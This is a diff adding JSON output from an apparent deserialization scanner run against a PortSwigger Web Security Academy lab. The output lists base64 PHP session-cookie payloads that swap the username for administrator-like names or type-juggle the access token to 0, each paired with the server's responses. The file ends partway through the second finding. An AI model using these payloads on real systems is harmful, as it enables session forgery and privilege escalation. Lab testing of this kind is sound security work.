@@ -1,0 +1,1105 @@
+{
+  "findings": [
+    {
+      "attempts": [
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2847,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImQ5bjZjNXp3eDFrdWY4ZXVscmRxbjJiemkwZHFvODB3Ijt9",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2563,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImQ5bjZjNXp3eDFrdWY4ZXVscmRxbjJiemkwZHFvODB3Ijt9",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2562,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjQ6InJvb3QiO3M6MTI6ImFjY2Vzc190b2tlbiI7czozMjoiZDluNmM1end4MWt1ZjhldWxyZHFuMmJ6aTBkcW84MHciO30=",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2567,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjk6InN1cGVydXNlciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJkOW42YzV6d3gxa3VmOGV1bHJkcW4yYnppMGRxbzgwdyI7fQ==",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2821,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjt9",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2813,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjU6ImFkbWluIjt9",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2812,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjQ6InJvb3QiO30=",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2817,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjk6InN1cGVydXNlciI7fQ==",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": "access_token->i:0",
+          "indicators": [
+            "Observation: response length changed by +69 bytes (baseline=3312 mutated=3381, same status 200) — possible behavioral change, verify manually",
+            "Response content differs in a small, localized way despite same status (similarity=0.99) (baseline='<!DOCTYPE html>\\n<html>\\n<!--LAB_HEAD_START-->\\n    <head>\\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\\n        <link href=/resources/css/labs.css rel=stylesheet>\\n    ' mutated='<!DOCTYPE html>\\n<html>\\n<!--LAB_HEAD_START-->\\n    <head>\\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\\n        <link href=/resources/css/labs.css rel=stylesheet>\\n    ')"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3381,
+            "status": 200
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtpOjA7fQ==",
+          "payload_type": "type_juggle"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": "username=administrator + access_token=i:0",
+          "indicators": [
+            "Observation: response length changed by -73 bytes (baseline=3312 mutated=3239, same status 200) — possible behavioral change, verify manually",
+            "Response content differs in a small, localized way despite same status (similarity=0.89) (baseline='<!DOCTYPE html>\\n<html>\\n<!--LAB_HEAD_START-->\\n    <head>\\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\\n        <link href=/resources/css/labs.css rel=stylesheet>\\n    ' mutated='<!DOCTYPE html>\\n<html>\\n<!--LAB_HEAD_START-->\\n    <head>\\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\\n        <link href=/resources/css/labs.css rel=stylesheet>\\n    ')"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3239,
+            "status": 200
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9",
+          "payload_type": "type_juggle_privesc"
+        }
+      ],
+      "confidence": "High",
+      "confirmation_status": "Suspected",
+      "exploit_type": "Privilege Escalation — String Manipulation",
+      "indicators": [
+        "Status code changed: baseline=200 mutated=500"
+      ],
+      "likely_vulnerable": true,
+      "location": "cookie",
+      "method": "GET",
+      "mutations_count": 10,
+      "name": "session",
+      "normalized": [
+        "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:12:\"access_token\";s:32:\"d9n6c5zwx1kuf8eulrdqn2bzi0dqo80w\";}"
+      ],
+      "notes": "String field detected — try changing role/privilege value",
+      "severity": "Medium",
+      "severity_note": null,
+      "subtype": null,
+      "suggested_probe": "modify_string",
+      "type": "PHP",
+      "url": "https://0a7b00d30427702480d15db7009f0032.web-security-academy.net/my-account?id=wiener"
+    },
+    {
+      "attempts": [
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/explo",
+            "length": 3888,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2847,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImQ5bjZjNXp3eDFrdWY4ZXVscmRxbjJiemkwZHFvODB3Ijt9",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/explo",
+            "length": 3888,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2563,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImQ5bjZjNXp3eDFrdWY4ZXVscmRxbjJiemkwZHFvODB3Ijt9",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/explo",
+            "length": 3888,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2562,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjQ6InJvb3QiO3M6MTI6ImFjY2Vzc190b2tlbiI7czozMjoiZDluNmM1end4MWt1ZjhldWxyZHFuMmJ6aTBkcW84MHciO30=",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/explo",
+            "length": 3888,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2567,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjk6InN1cGVydXNlciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJkOW42YzV6d3gxa3VmOGV1bHJkcW4yYnppMGRxbzgwdyI7fQ==",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/explo",
+            "length": 3888,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2821,
+            "status": 500
+          },
